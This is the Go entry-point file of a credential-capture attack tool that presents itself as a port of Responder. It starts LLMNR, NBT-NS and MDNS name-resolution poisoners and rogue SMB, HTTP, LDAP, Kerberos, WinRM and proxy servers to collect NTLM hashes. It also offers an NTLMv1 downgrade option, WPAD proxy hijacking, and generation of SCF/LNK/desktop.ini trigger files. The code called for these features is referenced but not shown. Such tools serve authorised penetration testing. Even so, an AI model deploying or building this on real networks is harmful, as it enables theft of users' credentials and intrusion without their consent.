package main

import (
	"flag"
	"fmt"
	"net"
	"os"
	"os/signal"
	"syscall"
)

var (
	verbose   bool
	outFile   string
	ifaceName string // stored at startup for printStartup
)

const banner = `
  ██████╗  ██████╗       ██████╗ ███████╗███████╗██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██████╗
 ██╔════╝ ██╔═══██╗      ██╔══██╗██╔════╝██╔════╝██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗
 ██║  ███╗██║   ██║█████╗██████╔╝█████╗  ███████╗██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗  ██████╔╝
 ██║   ██║██║   ██║╚════╝██╔══██╗██╔══╝  ╚════██║██╔═══╝ ██║   ██║██║╚██╗██║██║  ██║██╔══╝  ██╔══██╗
 ╚██████╔╝╚██████╔╝      ██║  ██║███████╗███████║██║     ╚██████╔╝██║ ╚████║██████╔╝███████╗██║  ██║
  ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝

  NTLMv2 Hash Capture Tool — Go static implementation
  Based on Responder by Laurent Gaffie (lgandx) — https://github.com/lgandx/Responder
  Go port for air-gapped environments (zero dependencies, single static binary)
`

func main() {
	// Core
	iface := flag.String("i", "", "Network interface to listen on (required)")
	flag.BoolVar(&verbose, "v", false, "Verbose output")
	flag.StringVar(&outFile, "o", "hashes.txt", "Output file for captured hashes")
	challenge := flag.String("c", "", "Fixed NTLM challenge (hex). Random if not set.")
	analyze := flag.Bool("A", false, "Analyze mode: log queries but do not poison")

	// Protocol disable flags
	noSMB := flag.Bool("no-smb", false, "Disable SMB server")
	noHTTP := flag.Bool("no-http", false, "Disable HTTP server")
	noHTTPS := flag.Bool("no-https", false, "Disable HTTPS server")
	noFTP := flag.Bool("no-ftp", false, "Disable FTP server")
	noSMTP := flag.Bool("no-smtp", false, "Disable SMTP server")
	noPOP3 := flag.Bool("no-pop3", false, "Disable POP3 server")
	noIMAP := flag.Bool("no-imap", false, "Disable IMAP server")
	noLDAP := flag.Bool("no-ldap", false, "Disable LDAP server")
	noDNS := flag.Bool("no-dns", false, "Disable DNS server")
	noDCERPC := flag.Bool("no-dcerpc", false, "Disable DCE-RPC server")
	noMSSQL := flag.Bool("no-mssql", false, "Disable MSSQL server")
	noWinRM := flag.Bool("no-winrm", false, "Disable WinRM server (port 5985)")
	noKerberos := flag.Bool("no-kerberos", false, "Disable Kerberos AS-REQ capture (port 88)")
	noProxy := flag.Bool("no-proxy", false, "Disable HTTP proxy NTLM capture (port 3128)")

	// NTLM options
	lm := flag.Bool("lm", false, "Force NTLMv1 by removing Extended Session Security flag (hashcat -m 5500)")

	// WPAD
	wpad := flag.Bool("wpad", false, "Enable WPAD PAC file serving from HTTP server")
	wpadProxy := flag.String("wpad-proxy", "", "Proxy host:port to advertise in WPAD PAC file (default: self:3128)")

	// Trigger file generation
	lnkgen := flag.String("lnkgen", "", "Generate trigger files (SCF/URL/LNK/desktop.ini) in this directory and exit")

	// Filtering (mirrors Responder -R/-r/-T/-N)
	respondTo := flag.String("RespondTo", "", "Comma-separated IPs to respond to (all others ignored)")
	flag.String("R", "", "Alias for --RespondTo")
	dontRespondTo := flag.String("DontRespondTo", "", "Comma-separated IPs to never respond to")
	flag.String("r", "", "Alias for --DontRespondTo")
	respondToName := flag.String("RespondToName", "", "Comma-separated hostnames to respond to")
	flag.String("T", "", "Alias for --RespondToName")
	dontRespondToName := flag.String("DontRespondToName", "", "Comma-separated hostnames to never respond to")
	flag.String("N", "", "Alias for --DontRespondToName")

	flag.Parse()

	// Resolve aliases
	if v := flag.Lookup("R").Value.String(); v != "" && *respondTo == "" {
		*respondTo = v
	}
	if v := flag.Lookup("r").Value.String(); v != "" && *dontRespondTo == "" {
		*dontRespondTo = v
	}
	if v := flag.Lookup("T").Value.String(); v != "" && *respondToName == "" {
		*respondToName = v
	}
	if v := flag.Lookup("N").Value.String(); v != "" && *dontRespondToName == "" {
		*dontRespondToName = v
	}

	// Trigger file generation mode — generate and exit
	if *lnkgen != "" {
		if *iface == "" {
			fmt.Fprintln(os.Stderr, "[-] -i <interface> required for --lnkgen")
			os.Exit(1)
		}
		ip, err := getIfaceIP(*iface)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
			os.Exit(1)
		}
		if err := GenerateTriggerFiles(ip, *lnkgen); err != nil {
			fmt.Fprintf(os.Stderr, "[-] lnkgen: %v\n", err)
			os.Exit(1)
		}
		return
	}

	if *iface == "" {
		fmt.Fprintln(os.Stderr, "[-] -i <interface> is required")
		flag.Usage()
		os.Exit(1)
	}

	ip, err := getIfaceIP(*iface)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Cannot get IP for interface %s: %v\n", *iface, err)
		os.Exit(1)
	}

	// Initialize
	ifaceName = *iface
	initSession(*challenge)
	analyzeMode = *analyze
	lmMode = *lm
	wpadEnabled = *wpad
	wpadProxyHost = *wpadProxy

	// Set up IP/name filters
	respondToIPs = parseIPList(*respondTo)
	dontRespondIPs = parseIPList(*dontRespondTo)
	respondToNames = parseNameList(*respondToName)
	dontRespondNames = parseNameList(*dontRespondToName)

	fmt.Print(banner)
	printStartup(ip, *noSMB, *noHTTP, *noHTTPS, *noFTP, *noSMTP, *noPOP3, *noIMAP, *noLDAP, *noDNS, *noDCERPC, *noMSSQL, *noWinRM, *noKerberos, *noProxy)

	// Poisoners
	go poisonLLMNR(ip)
	go poisonNBTNS(ip)
	go poisonMDNS(ip)
	if !*noDNS {
		go serveDNS(ip)
	}

	// Servers
	if !*noSMB {
		go serveSMB(ip)
	}
	if !*noHTTP {
		go serveHTTP(ip)
	}
	if !*noHTTPS {
		go serveHTTPS(ip)
	}
	if !*noFTP {
		go serveFTP(ip)
	}
	if !*noSMTP {
		go serveSMTP(ip)
	}
	if !*noPOP3 {
		go servePOP3(ip)
	}
	if !*noIMAP {
		go serveIMAP(ip)
	}
	if !*noLDAP {
		go serveLDAP(ip)
	}
	if !*noDCERPC {
		go serveDCERPC(ip, sessionDCERPCPort)
	}
	if !*noMSSQL {
		go serveMSSQL(ip)
	}
	if !*noWinRM {
		go serveWinRM(ip)
	}
	if !*noKerberos {
		go serveKerberos(ip)
	}
	if !*noProxy {
		go serveProxy(ip)
	}

	fmt.Println("[+] Listening for events...")
	fmt.Println()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
	<-sig
	fmt.Printf("\n[*] Shutting down. Hashes saved to %s\n", outFile)
}

func printStartup(ip net.IP, noSMB, noHTTP, noHTTPS, noFTP, noSMTP, noPOP3, noIMAP, noLDAP, noDNS, noDCERPC, noMSSQL, noWinRM, noKerberos, noProxy bool) {
	on := func(disabled bool) string {
		if disabled {
			return cRed + "OFF" + cReset
		}
		return cGreen + "ON " + cReset
	}

	fmt.Printf("[+] Poisoners:\n")
	fmt.Printf("    LLMNR                      [%s]\n", on(false))
	fmt.Printf("    NBT-NS                     [%s]\n", on(false))
	fmt.Printf("    MDNS                       [%s]\n", on(false))
	fmt.Printf("    DNS                        [%s]\n", on(noDNS))
	fmt.Println()

	fmt.Printf("[+] Servers:\n")
	fmt.Printf("    SMB server                 [%s]\n", on(noSMB))
	fmt.Printf("    HTTP server                [%s]\n", on(noHTTP))
	fmt.Printf("    HTTPS server               [%s]\n", on(noHTTPS))
	fmt.Printf("    FTP server                 [%s]\n", on(noFTP))
	fmt.Printf("    SMTP server                [%s]\n", on(noSMTP))
	fmt.Printf("    POP3 server                [%s]\n", on(noPOP3))
	fmt.Printf("    IMAP server                [%s]\n", on(noIMAP))
	fmt.Printf("    LDAP server                [%s]\n", on(noLDAP))
	fmt.Printf("    MSSQL server               [%s]\n", on(noMSSQL))
	fmt.Printf("    DCE-RPC server             [%s]\n", on(noDCERPC))
	fmt.Printf("    WinRM server               [%s]\n", on(noWinRM))
	fmt.Printf("    Kerberos server            [%s]\n", on(noKerberos))
	fmt.Printf("    HTTP Proxy                 [%s]\n", on(noProxy))
	fmt.Println()

	fmt.Printf("[+] Generic Options:\n")
	fmt.Printf("    Responder NIC              [%s]\n", ifaceName)
	fmt.Printf("    Responder IP               [%s]\n", ip)
	fmt.Printf("    Challenge set              [%s]\n", challengeHexStr())
	fmt.Printf("    LM downgrade               [%v]\n", lmMode)
	fmt.Printf("    Analyze mode               [%v]\n", analyzeMode)
	if wpadEnabled {
		fmt.Printf("    WPAD                       [ON — proxy %s]\n", wpadProxyHost)
	}
	fmt.Println()

	if len(respondToIPs) > 0 {
		fmt.Printf("[+] RespondTo filter:         %v\n", respondToIPs)
	}
	if len(dontRespondIPs) > 0 {
		fmt.Printf("[+] DontRespondTo filter:     %v\n", dontRespondIPs)
	}
	if len(respondToNames) > 0 {
		fmt.Printf("[+] RespondToName filter:     %v\n", respondToNames)
	}
	if len(dontRespondNames) > 0 {
		fmt.Printf("[+] DontRespondToName filter: %v\n", dontRespondNames)
	}

	fmt.Printf("[+] Current Session Variables:\n")
	fmt.Printf("    Responder Machine Name     [%s]\n", sessionMachineName)
	fmt.Printf("    Responder Domain Name      [%s]\n", sessionDomain)
	fmt.Printf("    Responder DCE-RPC Port     [%d]\n", sessionDCERPCPort)
	fmt.Printf("    Output file                [%s]\n", outFile)
	fmt.Println()
}

// getIfaceIP returns the first IPv4 address of the named interface.
func getIfaceIP(name string) (net.IP, error) {
	iface, err := net.InterfaceByName(name)
	if err != nil {
		return nil, err
	}
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		var ip net.IP
		switch v := a.(type) {
		case *net.IPNet:
			ip = v.IP
		case *net.IPAddr:
			ip = v.IP
		}
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("no IPv4 address on interface %s", name)
}
